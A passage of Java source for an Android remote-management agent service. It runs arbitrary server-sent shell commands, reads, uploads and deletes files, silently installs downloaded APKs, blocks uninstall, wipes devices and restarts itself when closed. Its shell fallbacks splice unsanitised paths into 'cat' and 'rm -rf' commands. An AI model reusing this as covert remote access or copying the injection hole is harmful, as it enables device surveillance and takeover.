    }

    private void executeShellCommand(final String cmd) {
        try {
            Executors.newSingleThreadExecutor().execute(new ShellRunnable(this, cmd));
        } catch (Throwable ignored) {}
    }

    void runShellSync(String cmd) {
        StringBuilder output = new StringBuilder();
        int exitCode = -1;
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while ((line = errReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            exitCode = process.waitFor();
        } catch (Throwable e) {
            output.append("Execution error: ").append(e.getMessage());
        }

        try {
            JSONObject resp = new JSONObject();
            resp.put("type", "shell_output");
            resp.put("agent_id", agentId);
            resp.put("output", output.toString());
            resp.put("exit_code", exitCode);
            if (wsClient != null && wsClient.isConnected()) {
                wsClient.send(resp.toString());
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onClose(int code, String reason) {
        log("Connection closed (" + code + "): " + reason);
        broadcastStatus("Disconnected");
        updateNotification("Connecting...");
    }

    @Override
    public void onError(Exception ex) {
        log("Connection error: " + ex.getMessage());
        broadcastStatus("Error: " + ex.getMessage());
    }

    private String getLocalIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Throwable ignored) {}
        return "127.0.0.1";
    }

    private void createNotificationChannel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) {
                    // Regular service channel (quiet, no alert)
                    NotificationChannel channel = new NotificationChannel(
                            CHANNEL_ID,
                            getApplicationLabelName() + " Service",
                            NotificationManager.IMPORTANCE_LOW
                    );
                    channel.setDescription("Background monitoring and telemetry");
                    channel.setShowBadge(false);
                    channel.enableLights(false);
                    channel.enableVibration(false);
                    channel.setSound(null, null);
                    nm.createNotificationChannel(channel);

                    // Emergency Lock channel (HIGH importance required by Android OS for full-screen lock enforcement)
                    NotificationChannel lockChannel = new NotificationChannel(
                            CHANNEL_LOCK_ID,
                            getApplicationLabelName() + " Remote Device Lock",
                            NotificationManager.IMPORTANCE_HIGH
                    );
                    lockChannel.setDescription("Enforces emergency device lock curtain");
                    lockChannel.setBypassDnd(true);
                    lockChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
                    nm.createNotificationChannel(lockChannel);
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Could not create notification channel: " + t.getMessage());
        }
    }

    private Notification buildNotification(String text) {
        PendingIntent pendingIntent = null;
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            pendingIntent = PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0
            );
        } catch (Throwable ignored) {}

        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);

        builder.setContentTitle(getApplicationLabelName())
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_launcher)
                .setOngoing(true)
                .setShowWhen(false)
                .setUsesChronometer(false);

        if (pendingIntent != null) {
            builder.setContentIntent(pendingIntent);
        }

        return builder.build();
    }

    private void updateNotification(String text) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.notify(NOTIFICATION_ID, buildNotification(text));
            }
        } catch (Throwable ignored) {}
    }

    private void broadcastStatus(String status) {
        try {
            Intent intent = new Intent(ACTION_STATUS_UPDATE);
            intent.putExtra(EXTRA_STATUS, status);
            sendBroadcast(intent);
        } catch (Throwable ignored) {}
    }

    private void log(String msg) {
        try {
            Intent intent = new Intent(ACTION_STATUS_UPDATE);
            intent.putExtra(EXTRA_LOG, msg);
            sendBroadcast(intent);
        } catch (Throwable ignored) {}
    }

    private String getClassesDexHash() {
        try {
            ZipFile zf = new ZipFile(getPackageCodePath());
            ZipEntry ze = zf.getEntry("classes.dex");
            if (ze != null) {
                InputStream is = zf.getInputStream(ze);
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                byte[] buf = new byte[8192];
                int n;
                while ((n = is.read(buf)) != -1) {
                    md.update(buf, 0, n);
                }
                is.close();
                zf.close();
                byte[] digest = md.digest();
                StringBuilder sb = new StringBuilder();
                for (byte b : digest) {
                    sb.append(String.format("%02x", b));
                }
                return sb.toString().substring(0, 16);
            }
            zf.close();
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Error computing dex hash: " + t.getMessage());
        }
        return "android_base";
    }

    private void performOtaUpdate(String downloadUrl, String expectedSha, String version) {
        if (downloadUrl == null || downloadUrl.trim().isEmpty()) {
            log("[OTA ERROR] Invalid or empty update download URL.");
            return;
        }
        new Thread(new OtaUpdateRunnable(this, downloadUrl, expectedSha, version)).start();
    }

    void executeOtaUpdate(String downloadUrl, String expectedSha, String version) {
        log("[OTA] Initiating auto-update to " + version + " from " + downloadUrl);
        updateNotification("Downloading app update (" + version + ")...");

        File updateApk = new File(getCacheDir(), "trmm_update.apk");
        try {
            if (updateApk.exists()) {
                updateApk.delete();
            }

            URL url = new URL(downloadUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(90000);
            conn.setRequestProperty("User-Agent", "TacticalRMM-AndroidAgent/" + Build.VERSION.RELEASE);
            conn.connect();

            int respCode = conn.getResponseCode();
            if (respCode != 200) {
                log("[OTA ERROR] Download failed: HTTP " + respCode);
                updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
                return;
            }

            InputStream in = conn.getInputStream();
            FileOutputStream fos = new FileOutputStream(updateApk);
            byte[] buffer = new byte[16384];
            int n;
            long totalBytes = 0;
            while ((n = in.read(buffer)) != -1) {
                fos.write(buffer, 0, n);
                totalBytes += n;
            }
            fos.flush();
            fos.close();
            in.close();
            conn.disconnect();

            log("[OTA] Update APK downloaded successfully (" + totalBytes + " bytes).");
        } catch (Throwable t) {
            log("[OTA ERROR] Failed to download APK: " + t.getMessage());
            updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
            return;
        }

        // Installation phase
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            boolean isOwner = false;
            try {
                isOwner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());
            } catch (Throwable ignored) {}

            log("[OTA] Applying update. Corporate Device Owner = " + isOwner);

            // 1. Silent PackageInstaller session (Device Owner and modern Android API)
            try {
                PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL
                );
                params.setAppPackageName(getPackageName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                }

                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);
                OutputStream sessionOut = session.openWrite("trmm_ota_pkg", 0, updateApk.length());
                FileInputStream fis = new FileInputStream(updateApk);
                byte[] buf = new byte[16384];
                int len;
                while ((len = fis.read(buf)) != -1) {
                    sessionOut.write(buf, 0, len);
                }
                session.fsync(sessionOut);
                fis.close();
                sessionOut.close();

                Intent callbackIntent = new Intent(this, BootReceiver.class);
                callbackIntent.setAction("com.trmm.agent.OTA_STATUS");
                int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    flags |= PendingIntent.FLAG_MUTABLE;
                }
                PendingIntent pi = PendingIntent.getBroadcast(this, sessionId, callbackIntent, flags);
                session.commit(pi.getIntentSender());
                session.close();
                log("[OTA SUCCESS] Silent PackageInstaller session #" + sessionId + " committed.");
                updateNotification("Updating " + getApplicationLabelName() + "...");
                return;
            } catch (Throwable t) {
                log("[OTA] PackageInstaller session exception: " + t.getMessage() + ". Trying shell pm install fallback...");
            }

            // 2. Shell fallback: pm install -r
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"pm", "install", "-r", updateApk.getAbsolutePath()});
                int exitCode = p.waitFor();
                if (exitCode == 0) {
                    log("[OTA SUCCESS] Shell pm install succeeded.");
                    return;
                }
            } catch (Throwable ignored) {}

            // 3. Fallback: System Package Installer Activity
            try {
                log("[OTA] Launching system package installer dialog...");
                Intent prompt = new Intent(Intent.ACTION_VIEW);
                prompt.setDataAndType(Uri.fromFile(updateApk), "application/vnd.android.package-archive");
                prompt.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(prompt);
            } catch (Throwable t) {
                log("[OTA ERROR] Could not invoke package installer intent: " + t.getMessage());
            }

        } catch (Throwable t) {
            log("[OTA ERROR] Installation exception: " + t.getMessage());
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.i("TRMMAgent", "onTaskRemoved: Activity swiped/closed. Maintaining 24/7 background presence...");
        safeStartForeground("Service Active");
        // Reschedule self and start service via BootReceiver alarm watchdog so app stays alive even if swiped from Recents
        BootReceiver.startAgentService(this);
        BootReceiver.scheduleWatchdog(this, 1000L);
        AgentJobService.schedule(this);
    }

    @Override
    public void onDestroy() {
        stopCurtainWatchdog();
        if (running) {
            // Unexpected kill by system, reschedule restart via BootReceiver and JobScheduler
            Log.i("TRMMAgent", "onDestroy: AgentService stopped unexpectedly. Rescheduling resuscitation...");
            BootReceiver.startAgentService(this);
            BootReceiver.scheduleWatchdog(this, 1000L);
            AgentJobService.schedule(this);
        }
        stopScreenStreaming();
        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        } catch (Throwable ignored) {}
        unregisterNetworkCallback();
        try {
            if (scheduler != null) scheduler.shutdownNow();
        } catch (Throwable ignored) {}
        try {
            if (wsClient != null) wsClient.close();
        } catch (Throwable ignored) {}
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        } catch (Throwable ignored) {}
        super.onDestroy();
    }

    private static class AgentNetworkCallback extends ConnectivityManager.NetworkCallback {
        private final java.lang.ref.WeakReference<AgentService> serviceRef;

        public AgentNetworkCallback(AgentService service) {
            this.serviceRef = new java.lang.ref.WeakReference<>(service);
        }

        @Override
        public void onAvailable(Network network) {
            Log.i("TRMMAgent", "Internet connection available. Reconnecting to Master Hub...");
            AgentService s = serviceRef.get();
            if (s != null) {
                s.ensureConnected();
            }
        }

        @Override
        public void onLost(Network network) {
            Log.w("TRMMAgent", "Internet connection lost.");
        }
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        .build();
                networkCallback = new AgentNetworkCallback(this);
                cm.registerNetworkCallback(request, networkCallback);
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "NetworkCallback registration warning: " + t.getMessage());
        }
    }

    private void unregisterNetworkCallback() {
        try {
            if (networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            }
        } catch (Throwable ignored) {}
    }

    private void handleAdminPolicy(JSONObject msg) {
        try {
            String action = msg.optString("action", "");
            log("Executing admin policy: " + action);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComp = AdminReceiver.getComponentName(this);
            boolean isOwner = (dpm != null && dpm.isDeviceOwnerApp(getPackageName()));
            boolean isAdmin = (dpm != null && dpm.isAdminActive(adminComp));

            if ("set_uninstall_blocked".equalsIgnoreCase(action) || "protect_uninstall".equalsIgnoreCase(action)) {
                boolean blocked = msg.optBoolean("blocked", true);
                if (isOwner) {
                    dpm.setUninstallBlocked(adminComp, getPackageName(), blocked);
                    log("Corporate uninstall protection set to: " + blocked);
                } else {
                    log("Device Owner privilege required to enforce uninstall block.");
                }
                SharedPreferences prefs = getSafePreferences(this, "trmm_agent_identity");
                if (prefs != null) prefs.edit().putBoolean("uninstall_blocked", blocked && isOwner).apply();
                sendTelemetry();
            } else if ("allow_uninstall".equalsIgnoreCase(action) || "de_enroll".equalsIgnoreCase(action)) {
                if (isOwner) {
                    dpm.setUninstallBlocked(adminComp, getPackageName(), false);
                    log("Authorized de-enrollment: uninstallation allowed.");
                }
                SharedPreferences prefs = getSafePreferences(this, "trmm_agent_identity");
                if (prefs != null) prefs.edit().putBoolean("uninstall_blocked", false).apply();
                sendTelemetry();
            } else if ("lock_device_now".equalsIgnoreCase(action)) {
                if (isAdmin) {
                    dpm.lockNow();
                    log("Device locked via DevicePolicyManager.");
                }
            } else if ("wipe_device".equalsIgnoreCase(action)) {
                if (isAdmin) {
                    log("Authorized enterprise wipe command received.");
                    dpm.wipeData(0);
                }
            }
        } catch (Throwable t) {
            log("Policy command error: " + t.getMessage());
        }
    }

    private final ExecutorService fileExecutor = Executors.newCachedThreadPool();

    private void handleFileList(JSONObject msg) {
        fileExecutor.execute(new FileListRunnable(this, msg));
    }

    private void handleFileRead(JSONObject msg) {
        fileExecutor.execute(new FileReadRunnable(this, msg));
    }

    private void handleFileDelete(JSONObject msg) {
        fileExecutor.execute(new FileDeleteRunnable(this, msg));
    }

    private File[] listDirectoryFiles(File dir) {
        if (dir == null) return null;
        File[] files = null;
        try {
            files = dir.listFiles();
        } catch (Throwable ignored) {}

        if (files != null) return files;

        // Fallback: enumerate via /system/bin/sh ls
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "ls -1ap \"" + dir.getAbsolutePath() + "\""});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            List<File> list = new ArrayList<>();
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || ".".equals(line) || "..".equals(line) || "./".equals(line) || "../".equals(line)) continue;
                boolean isDir = line.endsWith("/");
                String name = isDir ? line.substring(0, line.length() - 1) : line;
                list.add(new File(dir, name));
            }
            reader.close();
            p.waitFor();
            if (!list.isEmpty()) {
                return list.toArray(new File[0]);
            }
        } catch (Throwable ignored) {}

        return null;
    }

    void performFileList(JSONObject msg) {
        String reqId = msg.optString("req_id", "");
        String targetPath = msg.optString("path", "").trim();
        File dir;
        if (targetPath.isEmpty() || "/".equals(targetPath)) {
            dir = Environment.getExternalStorageDirectory();
        } else {
            dir = new File(targetPath);
        }

        if (!dir.exists()) {
            File ext = Environment.getExternalStorageDirectory();
            if (ext != null && ext.exists()) {
                dir = ext;
            } else {
                File appFiles = getExternalFilesDir(null);
                if (appFiles != null && appFiles.exists()) {
                    dir = appFiles;
                }
            }
        }

        JSONObject resp = new JSONObject();
        try {
            resp.put("type", "file_list_resp");
            resp.put("req_id", reqId);

            if (!dir.exists()) {
                resp.put("success", false);
                resp.put("error", "Directory does not exist: " + dir.getAbsolutePath());
                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
                return;
            }

            if (!dir.isDirectory()) {
                resp.put("success", false);
                resp.put("error", "Path is not a directory: " + dir.getAbsolutePath());
                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
                return;
            }

            String absPath = dir.getAbsolutePath();
            File parentFile = dir.getParentFile();
            String parentPath = (parentFile != null) ? parentFile.getAbsolutePath() : "";

            resp.put("path", absPath);
            resp.put("parent", parentPath);
            resp.put("can_write", dir.canWrite());
            resp.put("can_read", dir.canRead());

            JSONArray shortcuts = new JSONArray();
            addShortcut(shortcuts, "Internal Storage", Environment.getExternalStorageDirectory().getAbsolutePath(), "💾");
            addShortcut(shortcuts, "Downloads", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(), "📥");
            addShortcut(shortcuts, "Documents", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath(), "📄");
            addShortcut(shortcuts, "Pictures", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(), "🖼️");
            addShortcut(shortcuts, "DCIM", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(), "📷");
            File appFiles = getExternalFilesDir(null);
            if (appFiles != null) {
                addShortcut(shortcuts, "App Storage", appFiles.getAbsolutePath(), "📦");
            }
            resp.put("shortcuts", shortcuts);

            File[] filesList = listDirectoryFiles(dir);
            if (filesList == null || filesList.length == 0) {
                List<File> fallbackList = new ArrayList<>();
                try {
                    File[] publicDirs = new File[] {
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                        new File(Environment.getExternalStorageDirectory(), "Download"),
                        new File(Environment.getExternalStorageDirectory(), "DCIM"),
                        new File(Environment.getExternalStorageDirectory(), "Pictures"),
                        new File(Environment.getExternalStorageDirectory(), "Documents"),
                        new File(Environment.getExternalStorageDirectory(), "Android"),
                        getExternalFilesDir(null)
                    };
                    Set<String> seen = new HashSet<>();
                    for (File pf : publicDirs) {
                        if (pf != null && pf.exists() && seen.add(pf.getAbsolutePath())) {
                            fallbackList.add(pf);
                        }
                    }
                } catch (Throwable ignored) {}
                if (!fallbackList.isEmpty() && (filesList == null || filesList.length == 0)) {
                    filesList = fallbackList.toArray(new File[0]);
                }
            }

            if (filesList == null) {
                filesList = new File[0];
            }

            JSONArray arr = new JSONArray();
            if (filesList.length > 1) {
                for (int i = 0; i < filesList.length - 1; i++) {
                    for (int j = i + 1; j < filesList.length; j++) {
                        File f1 = filesList[i];
                        File f2 = filesList[j];
                        boolean f1Dir = f1.isDirectory();
                        boolean f2Dir = f2.isDirectory();
                        boolean swap = false;
                        if (!f1Dir && f2Dir) {
                            swap = true;
                        } else if (f1Dir == f2Dir) {
                            if (f1.getName().compareToIgnoreCase(f2.getName()) > 0) {
                                swap = true;
                            }
                        }
                        if (swap) {
                            filesList[i] = f2;
                            filesList[j] = f1;
                        }
                    }
                }
            }

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
            for (File f : filesList) {
                JSONObject item = new JSONObject();
                item.put("name", f.getName());
                item.put("path", f.getAbsolutePath());
                boolean isDir = f.isDirectory();
                item.put("is_dir", isDir);
                item.put("readable", f.canRead());
                item.put("writable", f.canWrite());
                item.put("modified", sdf.format(new Date(f.lastModified())));
                item.put("modified_ms", f.lastModified());
                item.put("last_modified", f.lastModified() / 1000L);

                if (isDir) {
                    item.put("size", 0);
                    item.put("size_fmt", "");
                    item.put("ext", "");
                } else {
                    long len = f.length();
                    item.put("size", len);
                    item.put("size_fmt", formatFileSize(len));
                    String name = f.getName();
                    int dot = name.lastIndexOf('.');
                    item.put("ext", (dot >= 0) ? name.substring(dot + 1).toLowerCase(Locale.US) : "");
                }
                arr.put(item);
            }

            resp.put("entries", arr);
            resp.put("files", arr);
            resp.put("success", true);
        } catch (Throwable t) {
            try {
                resp.put("success", false);
                resp.put("error", "Error reading directory: " + t.getMessage());
            } catch (Throwable ignored) {}
        }
        if (wsClient != null && wsClient.isConnected()) {
            wsClient.send(resp.toString());
        }
    }

    void performFileRead(JSONObject msg) {
        String reqId = msg.optString("req_id", "");
        String targetPath = msg.optString("path", "").trim();
        JSONObject resp = new JSONObject();
        try {
            resp.put("type", "file_read_resp");
            resp.put("req_id", reqId);

            File f = new File(targetPath);
            if (!f.exists() || !f.isFile()) {
                resp.put("success", false);
                resp.put("error", "File does not exist: " + targetPath);
                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
                return;
            }

            long fileLen = f.length();
            if (fileLen > 35 * 1024 * 1024) { // 35MB max for single base64 chunk
                resp.put("success", false);
                resp.put("error", "File exceeds 35MB transfer limit");
                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
                return;
            }

            byte[] data = null;
            if (f.canRead()) {
                try {
                    data = new byte[(int) fileLen];
                    FileInputStream fis = new FileInputStream(f);
                    int totalRead = 0;
                    int n;
                    while (totalRead < data.length && (n = fis.read(data, totalRead, data.length - totalRead)) != -1) {
                        totalRead += n;
                    }
                    fis.close();
                } catch (Throwable t) {
                    data = null;
                }
            }

            if (data == null) {
                // Shell fallback read via /system/bin/cat
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "cat \"" + targetPath + "\""});
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    InputStream is = p.getInputStream();
                    byte[] buf = new byte[8192];
                    int r;
                    while ((r = is.read(buf)) != -1) {
                        baos.write(buf, 0, r);
                    }
                    is.close();
                    p.waitFor();
                    if (baos.size() > 0) {
                        data = baos.toByteArray();
                        fileLen = data.length;
                    }
                } catch (Throwable ignored) {}
            }

            if (data == null) {
                resp.put("success", false);
                resp.put("error", "File is not readable (Permission Denied). Please ensure 'All Files Access' is granted.");
                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
                return;
            }

            resp.put("success", true);
            resp.put("name", f.getName());
            resp.put("path", f.getAbsolutePath());
            resp.put("size", fileLen);
            resp.put("mime_type", guessMimeType(f.getName()));
            resp.put("content_b64", Base64.encodeToString(data, Base64.NO_WRAP));
        } catch (Throwable t) {
            try {
                resp.put("success", false);
                resp.put("error", "Error reading file: " + t.getMessage());
            } catch (Throwable ignored) {}
        }
        if (wsClient != null && wsClient.isConnected()) {
            wsClient.send(resp.toString());
        }
    }

    void performFileDelete(JSONObject msg) {
        String reqId = msg.optString("req_id", "");
        String targetPath = msg.optString("path", "").trim();
        JSONObject resp = new JSONObject();
        try {
            resp.put("type", "file_delete_resp");
            resp.put("req_id", reqId);
            File f = new File(targetPath);
            if (!f.exists()) {
                resp.put("success", false);
                resp.put("error", "File does not exist: " + targetPath);
            } else {
                boolean del = f.delete();
                if (!del) {
                    try {
                        Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "rm -f \"" + targetPath + "\" || rm -rf \"" + targetPath + "\""});
                        del = (p.waitFor() == 0);
                    } catch (Throwable ignored) {}
                }
                resp.put("success", del);
                if (!del) resp.put("error", "Could not delete file (Read-only or permission restricted)");
            }
        } catch (Throwable t) {
            try {
                resp.put("success", false);
                resp.put("error", t.getMessage());
            } catch (Throwable ignored) {}
        }
        if (wsClient != null && wsClient.isConnected()) {
            wsClient.send(resp.toString());
        }
    }

    private void addShortcut(JSONArray shortcuts, String name, String path, String icon) {
        try {
            if (path == null) return;
            File f = new File(path);
            if (f.exists()) {
                JSONObject s = new JSONObject();
                s.put("name", name);
                s.put("path", path);
                s.put("icon", icon);
                shortcuts.put(s);
            }
        } catch (Throwable ignored) {}
    }

    private static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format(Locale.US, "%.1f %sB", bytes / Math.pow(1024, exp), pre);
    }

    private static String guessMimeType(String name) {
        String lower = name.toLowerCase(Locale.US);
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".gif")) return "image/gif";
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".txt") || lower.endsWith(".log")) return "text/plain";
        if (lower.endsWith(".json")) return "application/json";
        if (lower.endsWith(".apk")) return "application/vnd.android.package-archive";
        if (lower.endsWith(".mp4")) return "video/mp4";
        if (lower.endsWith(".mp3")) return "audio/mpeg";
        if (lower.endsWith(".zip")) return "application/zip";
        return "application/octet-stream";
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
